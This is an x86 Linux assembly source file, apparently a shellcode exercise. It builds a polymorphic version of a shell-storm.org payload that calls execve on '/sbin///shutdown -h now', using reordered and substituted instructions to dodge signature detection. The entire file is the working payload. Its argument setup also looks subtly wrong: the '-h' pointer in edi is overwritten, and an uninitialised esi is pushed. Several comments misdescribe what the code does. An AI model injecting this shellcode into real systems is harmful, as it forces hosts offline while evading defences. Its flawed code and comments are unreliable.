;---------------------------------
;
; Author: dubs3c
;
; Purpose:
; Create a polymorphic version of
; "shutdown -h now Shellcode" from
; shell-storm.org
;
;----------------------------------

global _start

section .text

_start:

    xor    ecx,ecx                      ; clear ecx
    mul    ecx                          ; clear both eax and edx
    push   edx                          ; push edx instead of eax
    push word 0x682d                    ; -h option
    mov    edi,esp                      ; save stack pointer to edi
    push   eax                          ; push null
    push byte 0x6e                      ; "n" character
    mov byte [esp+1], 0x6f              ; "o" character
    mov byte [esp+2], 0x77              ; "w" character
    mov    edi,esp                      ; save stack pointer to edi
    push   eax                          ; push null
    push   0x6e776f64                   ; these four push instructions correspond to /sbin///shutdown
    push   0x74756873
    push   0x2f2f2f6e
    push   0x6962732f
    mov    ebx,esp                      ; save stack pointer to ebx
    push   edx                          ; push null
    push   esi
    push   edi                          ; points to "-h now"
    push   ebx                          ; points to /sbin///shutdown
    mov    ecx,esp                      ; save stack pointer to ecx
    mov    al,0xc-1                     ; 0xc - 1 = 0xb which is execve() syscall
    int    0x80                         ; Execute syscall

